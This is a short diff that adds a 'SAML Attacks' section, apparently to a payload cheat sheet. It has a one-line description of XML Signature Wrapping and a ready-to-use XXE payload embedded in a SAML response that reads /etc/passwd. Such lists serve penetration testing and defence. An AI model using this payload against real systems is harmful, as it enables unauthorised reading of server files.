@@ -1,0 +1,7 @@
+# ---- SAML Attacks ----
+# XML Signature Wrapping (XSW):
+# Duplicate saml:Assertion, place malicious one before signature validates
+# XXE in SAML:
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<samlp:Response>&xxe;</samlp:Response>
